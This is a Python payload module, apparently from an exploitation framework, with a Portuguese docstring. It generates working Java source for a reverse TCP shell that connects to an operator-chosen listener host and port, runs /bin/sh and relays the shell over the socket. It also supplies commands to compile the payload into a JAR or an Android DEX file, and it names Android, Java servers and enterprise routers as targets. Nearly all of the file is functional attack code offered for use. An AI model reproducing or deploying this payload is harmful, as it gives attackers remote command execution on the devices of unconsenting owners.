"""Java Reverse TCP Shell.

Gera source Java compilável — target: Android (via d8/dex), servidores Java,
dispositivos embarcados com JVM (routers enterprise).
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Java Reverse TCP",
        "description": "Java reverse TCP shell — compilable to JAR or Android DEX.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        src = f"""import java.io.*;import java.net.*;
public class Payload {{
    public static void main(String[] args) throws Exception {{
        Socket s = new Socket("{lhost}", {lport});
        Process p = Runtime.getRuntime().exec("/bin/sh");
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while (!s.isClosed()) {{
            while (pi.available() > 0) so.write(pi.read());
            while (pe.available() > 0) so.write(pe.read());
            while (si.available() > 0) po.write(si.read());
            so.flush(); po.flush();
            Thread.sleep(50);
            try {{ p.exitValue(); break; }} catch (Exception e) {{}}
        }}
        p.destroy(); s.close();
    }}
}}"""
        return src.encode()

    def compile_command(self) -> str:
        return "javac Payload.java && jar cf payload.jar Payload.class"

    def android_command(self) -> str:
        return "javac Payload.java && d8 Payload.class --output payload.dex"
